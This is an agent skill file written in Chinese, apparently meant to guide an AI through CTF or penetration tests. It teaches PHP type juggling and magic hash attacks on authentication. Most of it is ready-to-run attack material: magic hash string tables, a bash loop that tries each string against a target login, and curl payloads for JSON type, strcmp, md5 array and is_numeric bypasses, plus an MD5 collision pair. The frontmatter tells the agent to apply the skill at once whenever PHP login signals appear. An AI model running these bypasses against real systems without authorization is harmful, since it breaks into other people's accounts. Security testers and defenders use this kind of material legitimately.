---
name: php-type-juggling
description: "PHP 类型杂耍（Type Juggling）和 Magic Hash 攻击方法论。当目标是 PHP 应用且存在密码比较、哈希校验、认证逻辑时使用。当看到 PHP `==` 松散比较、MD5/SHA1 哈希校验、strcmp 比较、JSON 输入处理、is_numeric 检查时必须使用。当错误登录泄露了输入的 MD5 哈希值时，这是 Magic Hash 的强信号，立即使用。CTF/渗透中 PHP 认证绕过最常见的漏洞类型之一。即使只是看到 PHP 5.x 或响应中包含哈希值，也应考虑使用此 skill"
metadata:
  tags: "php,type juggling,magic hash,loose comparison,strcmp,md5,sha1,0e,松散比较,认证绕过,弱类型"
  category: "exploit"
---

# PHP Type Juggling 攻击方法论


PHP 的弱类型系统是其最大的安全隐患之一。`==` 运算符在比较前会做类型转换，导致看似不同的值被判定为相等。

## Phase 0: 快速识别（10 秒判断）

看到以下任意信号，立即怀疑 type juggling：

| 信号 | 判断 |
|------|------|
| PHP 5.x（尤其 5.6 及以下） | 高概率，`==` 随处可见 |
| 错误响应中泄露了输入的 MD5/SHA1 哈希 | **极强信号** → Magic Hash |
| 登录/认证页面，PHP 后端 | 检查是否 `==` 比较 |
| JSON API 接受 PHP 后端处理 | 可以发送 `true`/`0`/`[]` 类型 |
| 源码中出现 `==`、`strcmp`、`md5()` | 直接利用 |
| "password incorrect" 但泄露哈希格式 | Magic Hash 场景 |

## Phase 1: Magic Hash 攻击（最常见场景）

### 原理

PHP 中 `"0e123456" == "0e789012"` 结果为 `true`。

因为 PHP 把 `0e` 开头的纯数字字符串当作科学计数法：`0 × 10^123456 = 0`，所以两边都等于 `0`。

当后端代码是：
```php
if (md5($user_input) == $stored_hash) { // 注意是 == 不是 ===
    // 认证成功
}
```
只要 `$stored_hash` 的 MD5 恰好是 `0e` 开头纯数字，攻击者只需输入任何一个已知 MD5 也是 `0e` 开头纯数字的字符串。

### Magic Hash 字符串速查表

**MD5 Magic Strings**（输入这些值，其 MD5 以 `0e` 开头且后跟纯数字）：

| 输入字符串 | MD5 值 |
|-----------|--------|
| `240610708` | `0e462097431906509019562988736854` |
| `QNKCDZO` | `0e830400451993494058024219903391` |
| `aabg7XSs` | `0e087386482136013740957780965295` |
| `aabC9RqS` | `0e041022518165728065344349536617` |
| `s878926199a` | `0e545993274517709034328855841020` |
| `s155964671a` | `0e342768416822451524974117254469` |
| `s214587387a` | `0e848240448830537924465865611904` |
| `0e215962017` | `0e291242476940776845150308577824` |

**SHA1 Magic Strings**：

| 输入字符串 | SHA1 值 |
|-----------|---------|
| `aaroZmOk` | `0e66507019969427134894567494305185566735` |
| `aaK1STfY` | `0e76658526655756207688271159624026011393` |
| `aaO8zKZF` | `0e89257456677279068558073954252716165668` |
| `aa3OFF9m` | `0e36977786278517984959260394024281014729` |

### 实战步骤

1. **确认场景**：看到密码验证 + PHP，尤其是错误时泄露 MD5 哈希
2. **验证 `0e` 判断**：如果泄露的"正确密码的哈希"恰好是 `0e[纯数字]`，那 100% 是 Magic Hash
3. **尝试所有 Magic String**：按上表逐个提交

```bash
# 批量测试 MD5 magic strings
for pw in "240610708" "QNKCDZO" "aabg7XSs" "aabC9RqS" "s878926199a" "s155964671a" "s214587387a" "0e215962017"; do
  echo "=== Testing: $pw ==="
  curl -s -X POST "$TARGET/index.php" -d "password=$pw" | grep -i "flag\|success\|welcome\|correct\|vault"
done
```

4. **如果正确密码哈希未知**，直接全部尝试——只要后端用 `==` 比较 MD5，任意两个 magic string 互相等价

> **关键认知**：不需要知道目标密码或目标哈希是什么。只要后端用了 `md5($input) == md5($stored)` 且 `$stored` 的 MD5 恰好是 `0e` 开头，任何 magic string 都能通过。

## Phase 2: 直接类型杂耍（非哈希场景）

### `==` 松散比较表（关键组合）

```
0 == "any_string"     → true  (PHP 5.x; PHP 8 已修复)
0 == ""               → true  (PHP 5.x)
0 == null             → true
"" == null            → true
false == ""           → true
false == 0            → true
false == null         → true
"0" == false          → true
"0" == null           → false (注意！)
1 == "1abc"           → true  (PHP 5.x)
"php" == 0            → true  (PHP 5.x)
```

### JSON 类型注入

当 PHP 接收 JSON 输入时，可以直接发送非字符串类型绕过比较：

```bash
# 原始请求（字符串密码）
curl -X POST "$TARGET/api/login" -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"wrong"}'

# 类型杂耍攻击：发送 true (bool)
curl -X POST "$TARGET/api/login" -H "Content-Type: application/json" \
  -d '{"username":"admin","password":true}'

# 类型杂耍攻击：发送 0 (int)
curl -X POST "$TARGET/api/login" -H "Content-Type: application/json" \
  -d '{"username":"admin","password":0}'

# 类型杂耍攻击：发送空数组
curl -X POST "$TARGET/api/login" -H "Content-Type: application/json" \
  -d '{"username":"admin","password":[]}'
```

**原理**：`true == "any_non_empty_string"` 在 PHP 中为 `true`。

### strcmp 绕过

```php
// 后端代码
if (strcmp($user_input, $secret) == 0) { ... }
```

`strcmp` 接收到数组参数时返回 `NULL`，而 `NULL == 0` 为 `true`：

```bash
# 表单参数发送数组
curl -X POST "$TARGET/login.php" -d "password[]=anything"

# JSON 发送数组
curl -X POST "$TARGET/api/auth" -H "Content-Type: application/json" \
  -d '{"password":[]}'
```

### is_numeric 绕过

```php
if (is_numeric($input) && $input > 9999) { ... }
```

十六进制字符串在 PHP 5.x 被 `is_numeric` 识别为数字：
```bash
# 0x270F = 9999
curl "$TARGET/check.php?input=0x270F"
```

## Phase 3: 哈希比较绕过（进阶）

### md5/sha1 数组绕过

`md5()` 和 `sha1()` 接收数组参数时返回 `NULL`，所以：

```php
// 后端
if (md5($_GET['a']) == md5($_GET['b'])) { ... }
```

```bash
# 两边都传数组 → md5(array) = NULL → NULL == NULL → true
curl "$TARGET/check.php?a[]=1&b[]=2"
```

### md5 碰撞（`===` 严格比较绕过）

当后端用 `===` 比较时，magic hash 和数组技巧都无效，需要真正的 MD5 碰撞：

```bash
# 经典 MD5 碰撞对（URL 编码的二进制数据）
a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2

b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2

curl "$TARGET/check.php" --data-urlencode "a=$a" --data-urlencode "b=$b"
```

## Phase 4: PHP 版本差异

| 行为 | PHP 5.x | PHP 7.x | PHP 8.0+ |
|------|---------|---------|----------|
| `0 == "string"` | `true` | `true` | **`false`** |
| `"0e123" == "0e456"` | `true` | `true` | `true`（仍然！） |
| `strcmp([], "str")` | `NULL` + warning | `NULL` + warning | `TypeError` |
| `md5([])` | `NULL` + warning | `NULL` + warning | `TypeError` |
| `"0x1A" == 26` | `true` | **`false`** | `false` |
| `json_decode` 类型保留 | ✅ | ✅ | ✅ |

> **重要**：`0e` Magic Hash 在 PHP 8.x 中仍然有效！因为两边都是字符串，`==` 仍然会做科学计数法转换。

## 决策树

```
看到 PHP 认证/比较逻辑？
├─ 错误响应泄露了 MD5 哈希？
│   ├─ 哈希是 0e[纯数字] → 100% Magic Hash，直接用 magic string 表
│   └─ 哈希不是 0e 开头 → 可能不是 type juggling，但仍尝试 magic strings（也许存储密码不同）
├─ 接受 JSON 输入？
│   └─ 尝试 true/0/[]/null → JSON type juggling
├─ 表单 POST 参数？
│   └─ 尝试 password[]=xxx → strcmp 绕过 / md5 数组绕过
├─ GET 参数哈希比较？
│   └─ 尝试 a[]=1&b[]=2 → md5/sha1 数组绕过
└─ 源码可读？
    ├─ 看到 == → 对应利用方式
    └─ 看到 === → 需要真碰撞或其他漏洞
```

## 注意事项

- Magic Hash 攻击不需要知道目标密码，只需要后端使用 `==` 比较哈希
- `0e` 后面必须全是数字才会触发科学计数法转换（`0e1a2b` 不会）
- 优先尝试 `240610708` 和 `QNKCDZO`，这两个是最经典的
- PHP 8.0 修复了 `0 == "string"` 但没修复 `"0e..." == "0e..."` magic hash
- 渗透报告中标记为 "CWE-1025: Comparison Using Wrong Factors"

## 深入参考

- Type Juggling 利用 payload 与登录绕过技术 → [references/type-juggling-exploitation.md](references/type-juggling-exploitation.md)
